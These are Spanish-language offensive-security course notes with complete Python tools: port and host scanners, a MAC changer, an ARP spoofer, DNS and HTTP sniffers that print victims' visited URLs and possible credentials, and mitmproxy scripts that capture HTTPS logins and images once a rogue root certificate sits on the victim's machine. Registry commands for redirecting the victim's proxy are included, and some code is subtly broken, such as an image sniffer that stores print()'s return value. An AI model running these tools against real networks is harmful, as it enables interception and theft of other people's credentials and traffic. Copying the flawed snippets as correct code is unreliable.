---
title: Python Ofensivo 🦭
tags:
  - Theory
  - Hack4u
---
>[!Warning]
>*This course is fully in spanish :d*

![](Pasted%20image%2020240826120138.png)

## Escáner de puertos TCP

```python
#!/usr/bin/env python3
import socket
import argparse
import sys
import signal # para manejar señales de teclado
from concurrent.futures import ThreadPoolExecutor # mejor que threading para evitar la creación de demasiados hilos
from termcolor import colored # para poner colores en la terminal

open_sockets = []

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...", 'red'))

    for socket in open_sockets:
        socket.close()
    
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner')
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.1.1)")
    parser.add_argument("-p", "--port", dest="port", required=True, help="Port range to scan (Ex: -p 1-100)")
    options = parser.parse_args()

    return options.target, options.port

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1) # el tiempo hasta el que se puede demorar para establecer la conexión

    open_sockets.append(s)

    return s

def port_scanner(port, host):

    s = create_socket()

    try: # es mejor hacerlo con excepciones
        s.connect((host, port))
        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        response = s.recv(1024).decode(errors='ignore').split('\n')

        if response:
            print(colored(f"\n[+] El puerto {port} está abierto - {response}\n", 'green'))

            for line in response:
                print(colored(line, 'grey'))
        else:
            print(colored(f"\n[+] El puerto {port} está abierto\n", 'green'))
    except (socket.timeout, ConnectionRefusedError):
        pass
    finally:
        s.close()

def scan_ports(ports, target):
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(lambda port: port_scanner(port, target), ports) # para cada puerto le aplico la función port scanner

def parse_ports(ports_str, target):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-'))
        return range(start, end+1)
    elif ',' in ports_str:
        return map(int, ports_str.split(','))
    else:
        return (int(ports_str),)

def main():
    target, ports_str = get_arguments()
    ports = parse_ports(ports_str, target)
    scan_ports(ports, target)
    

if __name__ == '__main__':
    main()
```

## Programa que cambia la dirección MAC (macchanger)

```python
#!/usr/bin/env python3

import argparse
import subprocess
import re # para las regex
from termcolor import colored
import signal
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para cambiar la dirección MAC de una interfaz de red")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Nombre de la interfaz de red")
    parser.add_argument("-m", "--mac", required=True, dest="mac_address", help="Nueva dirección MAC para la interfaz de red")

    return parser.parse_args()

def is_valid_input(interface, mac_address):
    is_valid_interface = re.match(r'^[e][n|t][s|h]\d{1,2}$', interface)
    is_valid_mac_address = re.match(r'^([A-Fa-f0-9]{2}[:]){5}[A-Fa-f0-9]{2}$', mac_address) # 00:0c:29:4d:18:eb <- ejemplo de mac

    return is_valid_interface and is_valid_mac_address

def change_mac_address(interface, mac_address):
    if is_valid_input(interface, mac_address):
        subprocess.run(["ifconfig", interface, "down"]) # aquí se evitan inyecciones de comandos
        subprocess.run(["ifconfig", interface, "hw", "ether", mac_address])
        subprocess.run(["ifconfig", interface, "up"])
        print(colored(f"\n[+] la MAC ha sido cambiada exitosamente", 'green'))
    else:
        print(colored("Los datos introducidos no son correctos", 'red'))

def main():
    args = get_arguments()
    change_mac_address(args.interface, args.mac_address)

if __name__ == '__main__':
    main()
```

## Escáner de red ICMP

```python
#!/usr/bin/env python3

import argparse
import subprocess
import signal
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor
import sys

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo del programa...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta para descubrir hosts activos en una red (ICMP)")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear")

    args = parser.parse_args()

    return args.target

def parse_target(target_str):
    #192.168.1.1-100
    target_str_splitted = target_str.split('.') # ["192", "168", "1", "1-100"]
    first_three_octets = '.'.join(target_str_splitted[:3]) # 192.168.1

    if len(target_str_splitted) == 4:
        if "-" in target_str_splitted[3]:
            start, end = target_str_splitted[3].split('-')
            return [f"{first_three_octets}.{i}" for i in range(int(start), int(end)+ 1)]
        else:
            return [target_str]
    else:
        print(colored(f"\n[!] El formato de IP o rango de IP no es válido", 'red'))

def host_discovery(target):
    try:
        ping = subprocess.run(["ping", "-c", "1", target], timeout=1, stdout=subprocess.DEVNULL) # DEVNULL: para no ver el stdout 

        if ping.returncode == 0: # host activo
            print(colored(f"\t[i] la IP {target} está activa", 'green'))
    except subprocess.TimeoutExpired:
        pass

def main():
    target_str = get_arguments()
    targets = parse_target(target_str)
    print(colored(f"\n[+] Hosts activos en la red:\n", 'blue'))

    max_threads = 100
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(host_discovery, targets)

if __name__ == '__main__':
    main()
```

## Escáner de red ARP con Scapy

```python
#!/usr/bin/env python3

import scapy.all as scapy
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Scanner")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host / IP Range to Scan")

    args = parser.parse_args()

    return args.target

def scan(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_packet/arp_packet # para unificar ambas capas

    answered, unanswered = scapy.srp(arp_packet, timeout=1, verbose=False) # para enviar el paquete

    response = answered.summary()

    if response:
        print(response)

def main():
    target = get_arguments()
    scan(target)

if __name__ == '__main__':
    main()
```

## Envenenador ARP (ARP Spoofer) con Scapy

```python
#!/usr/bin/env python3
import argparse
import time
import sys
import scapy.all as scapy
import signal # para manejar señales de teclado
from termcolor import colored # para poner colores en la terminal

# Con este script puedes ejecutar un MiTM colocándote entre el router y la máquina víctima

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66") # si pones 2 estás enviando una respuesta que no ha sido solicitada
    scapy.send(arp_packet, verbose=False) # no quiero recibir nada, solo tramitar el paquete concreto a su destino, por eso se usa send()

def main():
    arguments = get_arguments()

    while True: # hay que hacerlo continuamente porque en la red los dispositivos se comunican constantemente
        spoof(arguments.ip_address, "192.168.1.1") # la que se le envía a la máquina víctima
        spoof("192.168.1.1", arguments.ip_address) # la que se le envía al router haciéndose pasar por la máquina víctima
        time.sleep(2)

if __name__ == '__main__':
    main()
```

## Rastreador de consultas DNS (DNS Sniffer) con Scapy

- Combinarlo con el `arps_poofer.py` para interceptar el tráfico

```python
#!/usr/bin/env python3

import scapy.all as scapy

def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSQR): # filtra por paquetes que contengas la capa DNSQR
        #print(packet.show())
        domain = packet[scapy.DNSQR].qname.decode()
        exclude_keywords = ["google", "cloudflare", "bing", "static"] # blacklist

        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords): 
            domains_seen.add(domain)
            
            print(f"[+] Dominio: {domain}")

def sniff(interface):
    print(f"\n[+] Interceptando paquetes de la máquina víctima\n")
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

def main():
    sniff("ens33") # le pasas la interfaz de red a sniff

if __name__ == '__main__':
    global domains_seen
    domains_seen = set()

    main()
```

## Rastreador de consultas HTTP (HTTP sniffer) con Scapy

```python
#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from termcolor import colored
import signal # para manejar señales de teclado
import sys

def def_handler(sig, frame): # para cuando se para la ejecución de forma brusca
    print(colored(f"\n[!] Saliendo del programa...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Ctrl+C

def process_packet(packet):
    cred_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            print(colored(f"[+] URL visitada por la víctima: {url}", 'blue'))
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:
                    if keyword in response:
                        print(colored(f"\n[+] Posibles credenciales: {response}", 'green'))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def main():
    sniff("ens33") # le pasas la interfaz de red a sniff

if __name__ == '__main__':

    main()
```

## Rastreador de consultas HTTPS (HTTPS Sniffer) con mitmdump

- Instálalo:

```shell
mkdir MITM && cd MITM
wget mitmproxy-xxx.tar.gz
tar -xf mitmproxy-xxx.tar.gz && rm mitmproxy-xxx.tar.gz 
```

1. **Máquina víctima**

- Ejecuta el binario: `./mitweb` en la máquina atacante
- Configurar el proxy (Windows):

```cmd
add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 1 /f

add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
```

> Para eliminar el proxy:

```cmd
add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_DWORD /d 0 /f

del "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "IP_ATACANTE_PROXY:PUERTO" /f
```

- Visita [mitm.it](http://mitm.it) e instala el certificado.
	- Coloca el certificado en "Entidades de certificación raíz de confianza"
	- Borra el certificado de las descargas y vacía la papelera
- Para el binario `mitweb`

2. **Máquina atacante**

- Ejecuta el binario: `./mitmproxy`

```python
#!/usr/bin/env python3
from mitmproxy import http
from mitmproxy import ctx
from urllib.parse import urlparse

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):
    #ctx.log.info(f"[+] URL: {packet.request.url}")
    url = packet.request.url
    url_parsed = urlparse(url)
    scheme = url_parsed.scheme
    domain = url_parsed.netloc
    path = url_parsed.path

    print(f"[+] URL visitada por la víctima: {scheme}.//{domain}{path}")

    keywords = ["user", "pass"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"\[+] Posibles credenciales capturadas:\n{data}\n")
```

> [!Note]
> Para ejecutar el script: `./mitmdump -s https_sniffer.py`

## Rastreador de imágenes por HTTPS (HTTPS Image Sniffer) con mitmdump

```python
#!/usr/bin/env python3

from mitmproxy import http

def response(packet):
    content_type = print(packet.response.headers.get("content-type", "-")) # para los que no tienen un valor (None)

    try:
        if "image" in content_type:
            url = packet.request.url
            extension = content_type.split("/")[-1]
            
            if extension == "jpeg": # para evitar errores de previsualización de jpeg
                extension = "jpg" 

            file_name = f"images/{url.replace('/', '_').replace(':', '_')}.{extension}"
            image_data = packet.response.content

            with open(file_name, "wb") as f:
                f.write(image_data)

            print(f"[+] Imagen guardada: {file_name}")
    except:
        pass
```

- Ejecutar con `mitmdump -s https_image_sniffer.py --quiet`

